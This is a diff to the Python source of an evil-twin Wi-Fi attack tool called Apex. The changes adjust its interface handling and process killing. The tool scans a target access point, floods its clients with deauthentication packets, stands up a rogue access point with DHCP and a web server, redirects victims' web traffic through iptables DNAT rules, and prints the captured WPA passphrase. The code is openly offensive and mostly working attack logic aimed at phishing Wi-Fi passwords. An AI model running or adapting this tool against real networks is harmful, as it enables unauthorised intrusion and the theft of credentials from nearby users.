@@ -22,14 +22,16 @@ from core.accesspoints import Accesspoints as NetworkManager
 __version__ = 1.0
 
 class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceManager):
- def __init__(self,iface,bssid=None):
+ def __init__(self,iface,wlan=None):
   Deauth.__init__(self)
   Eviltwin.__init__(self)
   DnsServer.__init__(self)
   SiteHandler.__init__(self)
   NetworkManager.__init__(self)
-  InterfaceManager.__init__(self,iface) if not bssid else InterfaceManager.__init__(self,iface,bssid)
+  InterfaceManager.__init__(self,iface)
+
   self.iface = iface
+  self.wlan = wlan if wlan else iface
 
   self.out = '.data-01.out'
   self.csv = 'data-01.csv'
@@ -47,11 +49,21 @@ class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceMan
   self.monitorNetwork = False
 
  def _killProc(self):
-  cmd = "for task in `lsof -i  | grep -v 'COMMAND' | grep -v 'firefox-e' | awk '{print $2}'`; do kill -15 $task;done"
-  subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True).wait()
+  cmd0 = "for task in `lsof -i 80 | grep -v 'COMMAND' | grep -v 'firefox-e'\
+         | awk '{print $2}'`; do kill -9 $task;done"
+  cmd1 = "for task in `lsof -i 80 | grep -v 'COMMAND' | grep -v 'firefox-e'\
+         | awk '{print $2}'`; do kill -15 $task;done"
+  cmd2 = "for task in `lsof -i 53 | grep -v 'COMMAND' | grep -v 'firefox-e'\
+         | awk '{print $2}'`; do kill -9 $task;done"
+  cmd3 = "for task in `lsof -i 53 | grep -v 'COMMAND' | grep -v 'firefox-e'\
+         | awk '{print $2}'`; do kill -15 $task;done"
+
+  for cmd in [cmd0,cmd1,cmd2,cmd3]:
+   subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True).wait()
 
  def killProc(self):
-  for proc in ['airodump-ng','aireplay-ng','aircrack-ng','hostapd','lighttpd','php-cgi','dhcpd','apache2','wpa_supplicant']:
+  for proc in ['airodump-ng','aireplay-ng','aircrack-ng','hostapd','lighttpd',
+               'php-cgi','dhcpd','apache2','wpa_supplicant']:
    subprocess.Popen('pkill {}'.format(proc),stdout=devnull,stderr=devnull,shell=True).wait()
 
  def kill(self,killall=False):
@@ -73,10 +85,9 @@ class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceMan
  def exit(self,display=True):
   try:
    self.alive = False
-   try:
-    shutil.rmtree(ApeX)
+   try:shutil.rmtree(ApeX)
    except OSError:pass
-   self.destroyInterface()
+   time.sleep(.5)
    self.kill()
    if display:
     threading.Thread(target=self.exitMsg).start()
@@ -86,7 +97,6 @@ class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceMan
    time.sleep(5 if self.display else 1)
   finally:
    self._exit = True
-   self.kill(True)
    exit()
 
  def loading(self,ssid=None,load=False):
@@ -120,8 +130,11 @@ class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceMan
   subprocess.Popen(cmd,stdout=devnull,stderr=devnull)
 
  def startScan(self):
+  iface = 'mon0'
+
   threading.Thread(target=self.loading).start()
-  self.monitorMode()
+  self.monitorMode(iface)
+  self.iface = iface
   self.kill(True)
   self.remove()
   self.scan()
@@ -190,7 +203,6 @@ class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceMan
   if ap['client']:
    self.atk = True
    self.attack()
-   # time.sleep(3.5)
    if not self.handshake:
     self.readCap()
     self.readLog()
@@ -212,23 +224,24 @@ class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceMan
  def scanTarget(self):
   self.kill()
   self.remove()
-  cmd = ['airodump-ng','-a','--bssid',self.bssid,'-c',self.channel,'-w','data','--output-format','cap,csv',self.iface]
+  cmd = ['airodump-ng','-a','--bssid',self.bssid,'-c',self.channel,'-w',
+         'data','--output-format','cap,csv',self.iface]
   subprocess.Popen(cmd,stdout=devnull,stderr=devnull)
   time.sleep(1.5)
 
 class Apex(Aircrack):
- def __init__(self,iface,bssid,_bssid,essid,channel):
-  super(Apex,self).__init__(iface,bssid)
+ def __init__(self,iface,wlan,bssid,_bssid,essid,channel):
+  super(Apex,self).__init__(iface,wlan=wlan)
   self.bssid = bssid # eviltwin ap
   self.essid = essid
-  self._iface = 'mon0' # deauth interface
+  self._iface = 'mon1' # deauth interface
   self._bssid = _bssid # target ap
   self.channel = channel
 
  def disconnect(self):
   time.sleep(5)
   self.configAttack()
-  self.createInterface()
+  self.monitorMode('mon1')
   while all([not self.passphrase,self.alive]):
    try:map(self.sendPkts,range(256))
    except:pass
@@ -239,8 +252,10 @@ class Apex(Aircrack):
   Dhcpd().write()
 
  def route(self):
-  subprocess.Popen('ifconfig {} 192.168.0.1 netmask 255.255.255.0'.format(self.iface),stdout=devnull,stderr=devnull,shell=True).wait()
-  subprocess.Popen('route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1',stdout=devnull,stderr=devnull,shell=True).wait()
+  subprocess.Popen('ifconfig {} 192.168.0.1 netmask 255.255.255.0'.format(self.iface),
+  stdout=devnull,stderr=devnull,shell=True).wait()
+  subprocess.Popen('route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1',
+  stdout=devnull,stderr=devnull,shell=True).wait()
   subprocess.Popen('sysctl -w net.ipv4.ip_forward=1',stdout=devnull,shell=True).wait()
 
  def startAp(self):
@@ -250,10 +265,12 @@ class Apex(Aircrack):
 
  def iptables(self):
   cmds = ['iptables --flush','iptables --table nat --flush','iptables --delete-chain','iptables -P FORWARD ACCEPT',
-          'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80',
-          'iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.0.1:443',
-          'iptables -A INPUT -p tcp --sport 443 -j ACCEPT','iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT',
-          'iptables -t nat -A POSTROUTING -j MASQUERADE']
+  'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80',
+  'iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.0.1:443',
+  'iptables -A INPUT -p tcp --sport 443 -j ACCEPT','iptables\
+  -A OUTPUT -p tcp --dport 443 -j ACCEPT',
+  'iptables -t nat -A POSTROUTING -j MASQUERADE']
+
   for cmd in cmds:
    subprocess.Popen(cmd,stdout=devnull,shell=True).wait()
 
@@ -306,8 +323,8 @@ def main():
  args = args.parse_args()
 
  # assign variables
- iface = args.interface
- engine = Aircrack(iface)
+ wlan = args.interface
+ engine = Aircrack(wlan)
  apexDir = ApeX
 
  # remove directory
@@ -373,7 +390,7 @@ def main():
  # run eviltwin accesspoint
  try:
   # set phishing variable
-  apex = Apex(engine.iface,engine.macAddress,engine.bssid,engine.essid,engine.channel)
+  apex = Apex(engine.iface,wlan,engine.mac,engine.bssid,engine.essid,engine.channel)
 
   # creating eviltwin accesspoint ...
   threading.Thread(target=engine.loading,kwargs={'load':True}).start()
@@ -421,7 +438,7 @@ def main():
  finally:
   engine.loadAp = False
   if apex.passphrase:
-   time.sleep(10)
+   time.sleep(10) # gif loading
    subprocess.call(['clear'])
    print 'Password Found: {}'.format(apex.passphrase[0])
    apex.exit(False)
